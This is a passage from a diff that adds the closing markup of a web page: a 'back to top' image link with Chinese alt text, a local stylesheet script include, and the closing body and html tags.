+        <img src="http://wyb0.com/img/goto_top.png" alt="可以返回顶部" title="回到顶部"/>
+      </a>
+    </div>
+
+    <script src="/js/style.js"></script>
+
+    
+    
+
+</body>
+</html>
+
+
